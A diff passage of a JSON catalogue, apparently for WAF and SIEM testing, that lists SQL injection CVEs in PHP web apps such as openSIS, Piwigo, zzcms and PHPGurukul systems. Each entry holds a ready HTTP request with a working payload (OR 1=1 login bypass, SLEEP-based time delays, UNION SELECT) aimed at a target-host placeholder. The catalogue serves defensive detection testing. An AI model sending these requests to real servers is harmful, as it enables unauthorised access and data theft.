+        "title": "poc_github for CVE-2021-40956",
+        "link": "https://github.com/bettershop/LaikeTui/issues/13"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-40907 - SourceCodester Storage Unit Rental Management System SQL Injection",
+    "displayName": "CVE-2021-40907 - SourceCodester Storage Unit Rental Management System SQL Injection",
+    "description": "SourceCodester Storage Unit Rental Management System v1 (oretnom23) is vulnerable to SQL injection via the 'username' parameter of /storage/classes/Login.php. The request sends an authentication-bypass payload (' OR 1=1-- -) in the username form field of the login handler. Method POST inferred from the login form (f=login action). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-08-09072021 (PoC)\n- https://nvd.nist.gov/vuln/detail/CVE-2021-40907 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /storage/classes/Login.php?f=login HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=%27+OR+1%3D1--+-&password=x\n"
+    },
+    "cves": [
+      "CVE-2021-40907"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-40907",
+        "link": "https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-08-09072021"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-40961 - CMS Made Simple SQL Injection",
+    "displayName": "CVE-2021-40961 - CMS Made Simple SQL Injection",
+    "description": "CMS Made Simple <=2.2.15 is vulnerable to SQL injection in the News module admin article listing (modules/News/function.admin_articlestab.php), where the 'sortby' argument is concatenated into the query's ORDER BY clause without the need for a quote. The request reaches the tab via the admin moduleinterface with the News module action prefix (m1_sortby) and injects a subquery containing SELECT SLEEP(5) into the ORDER BY. Method GET inferred; the m1_ module prefix follows the CMS Made Simple admin convention. No vendor WAF rule found; built from the advisory (file + 'sortby' argument).\n\nReferences used to recreate this request:\n- https://github.com/beerpwn/CVE/blob/master/cms_made_simple_2021/sqli_order_by/CMS-MS-SQLi-report.md (PoC/report)\n- https://packetstormsecurity.com/files/161895/CMS-Made-Simple-2.2.15-SQL-Injection.html (PoC advisory)\n- https://nvd.nist.gov/vuln/detail/CVE-2021-40961 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /admin/moduleinterface.php?mact=News,m1_,admin_articlestab,0&m1_sortby=news_date%2C(SELECT%20SLEEP(5)) HTTP/1.1\nHost: {{target_host}}\nCookie: CMSSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-40961"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-40961",
+        "link": "https://github.com/beerpwn/CVE/blob/master/cms_made_simple_2021/sqli_order_by/CMS-MS-SQLi-report.md"
+      },
+      {
+        "title": "poc_packetstorm for CVE-2021-40961",
+        "link": "https://packetstormsecurity.com/files/161895/CMS-Made-Simple-2.2.15-SQL-Injection.html"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-40543 - OS4ED openSIS-Classic SQL Injection",
+    "displayName": "CVE-2021-40543 - OS4ED openSIS-Classic SQL Injection",
+    "description": "OS4ED openSIS-Classic 8.0 is vulnerable to SQL injection via the $_GET['usrid'] (and prof_id) parameter in PasswordCheck.php. The request sends a time-based SQLi payload in usrid. Method is GET per the advisory ($_GET). No vendor WAF rule found; built from the issue advisory.\n\nReferences used to recreate this request:\n- https://github.com/OS4ED/openSIS-Classic/issues/191 (PoC/advisory)\n- https://www.cve.org/CVERecord?id=CVE-2021-40543 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /PasswordCheck.php?usrid=1%27%20AND%20SLEEP(5)--%20-&prof_id=1 HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-40543"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-40543",
+        "link": "https://github.com/OS4ED/openSIS-Classic/issues/191"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-40353 - OS4ED openSIS SQL Injection",
+    "displayName": "CVE-2021-40353 - OS4ED openSIS SQL Injection",
+    "description": "OS4ED openSIS 8.0 is vulnerable to authentication-bypass SQL injection via the USERNAME parameter of the index.php login form (incomplete fix for CVE-2020-6637). The request sends an OR 1=1 payload in USERNAME. Method inferred POST (login form submission). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/5qu1n7/CVE-2021-40353 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-40353 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /index.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nUSERNAME=%27+OR+1%3D1--+-&PASSWORD=x&log=\n"
+    },
+    "cves": [
+      "CVE-2021-40353"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-40353",
+        "link": "https://github.com/5qu1n7/CVE-2021-40353"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-40317 - Piwigo SQL Injection",
+    "displayName": "CVE-2021-40317 - Piwigo SQL Injection",
+    "description": "Piwigo 11.5.0 is vulnerable to SQL injection via the id parameter of admin.php. The request sends a time-based SQLi payload in id. Method inferred GET (id lookup parameter). No vendor WAF rule found; built from the issue advisory.\n\nReferences used to recreate this request:\n- https://github.com/Piwigo/Piwigo/issues/1470 (PoC/advisory)\n- https://www.cve.org/CVERecord?id=CVE-2021-40317 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /admin.php?id=1%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: pwg_id=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-40317"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-40317",
+        "link": "https://github.com/Piwigo/Piwigo/issues/1470"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-40313 - Piwigo SQL Injection",
+    "displayName": "CVE-2021-40313 - Piwigo SQL Injection",
+    "description": "Piwigo 11.5 is vulnerable to SQL injection via the pwg_token parameter in /admin/batch_manager_global.php. The request sends an OR 1=1 payload in pwg_token. Method inferred POST (batch-manager form action). No vendor WAF rule found; built from the issue advisory.\n\nReferences used to recreate this request:\n- https://github.com/Piwigo/Piwigo/issues/1469 (PoC/advisory)\n- https://www.cve.org/CVERecord?id=CVE-2021-40313 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/batch_manager_global.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: pwg_id=dummy\n\npwg_token=%27+OR+1%3D1--+-&selectAction=delete\n"
+    },
+    "cves": [
+      "CVE-2021-40313"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-40313",
+        "link": "https://github.com/Piwigo/Piwigo/issues/1469"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-40309 - OS4ED openSIS SQL Injection",
+    "displayName": "CVE-2021-40309 - OS4ED openSIS SQL Injection",
+    "description": "OS4ED openSIS 8.0 is vulnerable to authenticated SQL injection via the cp_id_miss_attn parameter of the Take Attendance feature (Ajax.php -> TakeAttendance.php). The request sends a time-based SLEEP payload in cp_id_miss_attn. Method and full path (GET) taken verbatim from the Exploit-DB PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/50249 (PoC)\n- https://github.com/MiSERYYYYY/Vulnerability-Reports-and-Disclosures/blob/main/OpenSIS-Community-8.0.md (write-up)\n- https://www.cve.org/CVERecord?id=CVE-2021-40309 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Ajax.php?modname=users/TeacherPrograms.php?include=attendance/TakeAttendance.php&modfunc=attn&attn=miss&from_dasboard=1&date=Aug/9/2021&cp_id_miss_attn=27%20AND%20(SELECT%201670%20FROM%20(SELECT(SLEEP(5)))x)&cpv_id_miss_attn=23&ajax=true HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-40309"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-40309",
+        "link": "https://www.exploit-db.com/exploits/50249"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-40280 - zzcms SQL Injection",
+    "displayName": "CVE-2021-40280 - zzcms SQL Injection",
+    "description": "zzcms 8.2/8.3/2020/2021 is vulnerable to SQL injection via the id parameter in admin/dl_sendmail.php. The request sends a time-based SQLi payload in id. Method inferred GET (id parameter). No vendor WAF rule found; built from the advisory/PoC gist.\n\nReferences used to recreate this request:\n- https://gist.github.com/aaaahuia/1fd31c1ebcddfe4c95268fa4f31fc312 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-40280 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /admin/dl_sendmail.php?id=1%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-40280"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_gist for CVE-2021-40280",
+        "link": "https://gist.github.com/aaaahuia/1fd31c1ebcddfe4c95268fa4f31fc312"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-40279 - zzcms SQL Injection",
+    "displayName": "CVE-2021-40279 - zzcms SQL Injection",
+    "description": "zzcms 8.2/8.3/2020/2021 is vulnerable to SQL injection via the id parameter in admin/bad.php. The request sends a UNION SELECT payload in id. Method inferred GET (id parameter). No vendor WAF rule found; built from the advisory/PoC gist.\n\nReferences used to recreate this request:\n- https://gist.github.com/aaaahuia/b99596c6de9bd6f60e0ddb7bf0bd13c4 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-40279 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /admin/bad.php?id=1%20UNION%20SELECT%201,2,3,4,5,6,7,8--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-40279"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_gist for CVE-2021-40279",
+        "link": "https://gist.github.com/aaaahuia/b99596c6de9bd6f60e0ddb7bf0bd13c4"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-40247 - SourceCodester Budget and Expense Tracker System SQL Injection",
+    "displayName": "CVE-2021-40247 - SourceCodester Budget and Expense Tracker System SQL Injection",
+    "description": "SourceCodester Budget and Expense Tracker System v1 (oretnom23) is vulnerable to authentication-bypass SQL injection via the username field of the admin login. The request sends an OR 1=1 payload in username. Login page/path from the Exploit-DB PoC (/expense_budget/admin/login.php); method inferred POST (login form). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/50307 (PoC)\n- https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/B%26E%20Tracker-by:oretnom23-v1.0 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-40247 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /expense_budget/admin/login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin%27+OR+1%3D1--+-&password=x\n"
+    },
+    "cves": [
+      "CVE-2021-40247"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-40247",
+        "link": "https://www.exploit-db.com/exploits/50307"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-39379 - OS4ED openSIS SQL Injection",
+    "displayName": "CVE-2021-39379 - OS4ED openSIS SQL Injection",
+    "description": "OS4ED openSIS 8.0 is vulnerable to SQL injection via the password_stn_id parameter in ResetUserInfo.php. The request sends a time-based SQLi payload in password_stn_id. Method inferred GET (id-style lookup parameter). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/security-n/CVE-2021-39379 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-39379 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /ResetUserInfo.php?password_stn_id=1%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-39379"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-39379",
+        "link": "https://github.com/security-n/CVE-2021-39379"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2026-5551 - itsourcecode Free Hotel Reservation System SQL Injection",
     "displayName": "CVE-2026-5551 - itsourcecode Free Hotel Reservation System SQL Injection",
     "description": "itsourcecode Free Hotel Reservation System 1.0 is vulnerable to SQL injection in the 'email' argument of /hotel/admin/login.php (Parameter Handler). The request sends a boolean-based SQLi payload in the email field of the admin login form. No vendor WAF rule found; built from the VulDB description. Method POST inferred (admin login form action).\n\nReferences used to recreate this request:\n- https://github.com/jasonwong666/cve/issues/1 (PoC)\n- https://vuldb.com/vuln/355315 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5551 (CVE record)",
@@ -403692,6 +405050,382 @@
       {
         "title": "poc_github for CVE-2026-5179",
         "link": "https://github.com/dyh1213-wq/cve/issues/3"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-26935 - WoWonder Social Network SQL Injection",
+    "displayName": "CVE-2021-26935 - WoWonder Social Network SQL Injection",
+    "description": "WoWonder before 3.1 is vulnerable to SQL injection in the event_id parameter of the requests.php?f=search-my-followers action. The request sends a time-based SQL injection payload in event_id. No vendor WAF rule found; built from the CVE/advisory entry point. HTTP method inferred as POST (requests.php is an AJAX action endpoint that takes action via the f query parameter and data in the body) and flagged.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/49657 (PoC, not reachable this session)\n- https://securityforeveryone.com/blog/wowonder-0-day-vulnerability-cve-2021-26935 (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2021-26935 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /requests.php?f=search-my-followers HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nevent_id=1%27%20AND%20SLEEP(5)--%20-&s=dummy\n"
+    },
+    "cves": [
+      "CVE-2021-26935"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-26935",
+        "link": "https://www.exploit-db.com/exploits/49657"
+      },
+      {
+        "title": "advisory for CVE-2021-26935",
+        "link": "https://securityforeveryone.com/blog/wowonder-0-day-vulnerability-cve-2021-26935"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-26830 - Tribalsystems Zenario CMS SQL Injection",
+    "displayName": "CVE-2021-26830 - Tribalsystems Zenario CMS SQL Injection",
+    "description": "Tribalsystems Zenario CMS 8.8.52729 is vulnerable to SQL injection via the ID input field of ajax.php in the Plugin library - delete module. The request sends a UNION SELECT payload in the ID parameter. No vendor WAF rule found; built from the CVE description entry point (file ajax.php, argument ID). HTTP method inferred as GET (ID is a record selector for a delete action) and flagged; the admin module-routing parameter is not public.\n\nReferences used to recreate this request:\n- https://github.com/TribalSystems/Zenario/releases/tag/8.8.53370 (fix release)\n- https://www.cve.org/CVERecord?id=CVE-2021-26830 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /ajax.php?ID=-1%20UNION%20SELECT%201,2,3,4,5--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-26830"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2021-26830",
+        "link": "https://github.com/TribalSystems/Zenario/releases/tag/8.8.53370"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-26822 - PHPGurukul Teachers Record Management System SQL Injection",
+    "displayName": "CVE-2021-26822 - PHPGurukul Teachers Record Management System SQL Injection",
+    "description": "PHPGurukul Teachers Record Management System 1.0 is vulnerable to unauthenticated SQL injection in the searchteacher POST parameter of search-teacher.php. The request sends a UNION SELECT payload in searchteacher. No vendor WAF rule found; built from the CVE/PoC entry point (POST parameter explicitly named).\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/49562 (PoC, not reachable this session)\n- https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-26822 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-26822 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /search-teacher.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nsearchteacher=test%27%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7--%20-&submit=\n"
+    },
+    "cves": [
+      "CVE-2021-26822"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-26822",
+        "link": "https://www.exploit-db.com/exploits/49562"
+      },
+      {
+        "title": "poc_github for CVE-2021-26822",
+        "link": "https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-26822"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-26765 - PHPGurukul Student Record System SQL Injection",
+    "displayName": "CVE-2021-26765 - PHPGurukul Student Record System SQL Injection",
+    "description": "PHPGurukul Student Record System 4.0 is vulnerable to SQL injection via the sid parameter of edit-sub.php. The request sends a UNION SELECT payload in sid. No vendor WAF rule found; built from the CVE/PoC entry point. HTTP method is GET (sid is a record selector) per the PoC. A dummy admin session cookie is included because the page is in the admin area.\n\nReferences used to recreate this request:\n- https://packetstormsecurity.com/files/161237/Student-Record-System-4.0-SQL-Injection.html (PoC)\n- https://github.com/BigTiger2020/Student-Record-System-/blob/main/README.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-26765 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /edit-sub.php?sid=-1%20UNION%20SELECT%201,2,3,4,5,6--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-26765"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_packetstorm for CVE-2021-26765",
+        "link": "https://packetstormsecurity.com/files/161237/Student-Record-System-4.0-SQL-Injection.html"
+      },
+      {
+        "title": "poc_github for CVE-2021-26765",
+        "link": "https://github.com/BigTiger2020/Student-Record-System-/blob/main/README.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-26764 - PHPGurukul Student Record System SQL Injection",
+    "displayName": "CVE-2021-26764 - PHPGurukul Student Record System SQL Injection",
+    "description": "PHPGurukul Student Record System 4.0 is vulnerable to SQL injection via the id parameter of edit-std.php. The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the CVE/PoC entry point. HTTP method is GET (id is a record selector) per the PoC. A dummy admin session cookie is included because the page is in the admin area.\n\nReferences used to recreate this request:\n- https://packetstormsecurity.com/files/161237/Student-Record-System-4.0-SQL-Injection.html (PoC)\n- https://github.com/BigTiger2020/Student-Record-System-/blob/main/README.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-26764 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /edit-std.php?id=-1%20UNION%20SELECT%201,2,3,4,5,6--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-26764"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_packetstorm for CVE-2021-26764",
+        "link": "https://packetstormsecurity.com/files/161237/Student-Record-System-4.0-SQL-Injection.html"
+      },
+      {
+        "title": "poc_github for CVE-2021-26764",
+        "link": "https://github.com/BigTiger2020/Student-Record-System-/blob/main/README.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-26762 - PHPGurukul Student Record System SQL Injection",
+    "displayName": "CVE-2021-26762 - PHPGurukul Student Record System SQL Injection",
+    "description": "PHPGurukul Student Record System 4.0 is vulnerable to SQL injection via the cid parameter of edit-course.php. The request sends a UNION SELECT payload in cid. No vendor WAF rule found; built from the CVE/PoC entry point. HTTP method is GET (cid is a record selector) per the PoC. A dummy admin session cookie is included because the page is in the admin area.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/49513 (PoC, not reachable this session)\n- https://www.cve.org/CVERecord?id=CVE-2021-26762 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /edit-course.php?cid=-1%20UNION%20SELECT%201,2,3,4,5,6--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-26762"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2021-26762",
+        "link": "https://www.exploit-db.com/exploits/49513"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-26754 - wpDataTables WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-26754 - wpDataTables WordPress Plugin SQL Injection",
+    "description": "wpDataTables before 3.4.1 mishandles the order direction for server-side tables, allowing SQL injection via the order[0][dir] parameter of the admin-ajax.php get_wdtable action. The request sends a time-based SQL injection payload in order[0][dir]. No vendor WAF rule found; built from the advisory entry point. A dummy nonce and session cookie are included (the action is authenticated); the WAF inspects the request before WordPress validates them.\n\nReferences used to recreate this request:\n- https://n4nj0.github.io/advisories/wordpress-plugin-wpdatatables-i/ (advisory)\n- https://wpdatatables.com/help/whats-new-changelog/ (changelog)\n- https://www.cve.org/CVERecord?id=CVE-2021-26754 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin-ajax.php?action=get_wdtable&table_id=1&draw=1&order%5B0%5D%5Bcolumn%5D=0&order%5B0%5D%5Bdir%5D=asc%2C(SELECT%201%20FROM%20(SELECT%20SLEEP(5))x)&wdtNonce=dummy HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-26754"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
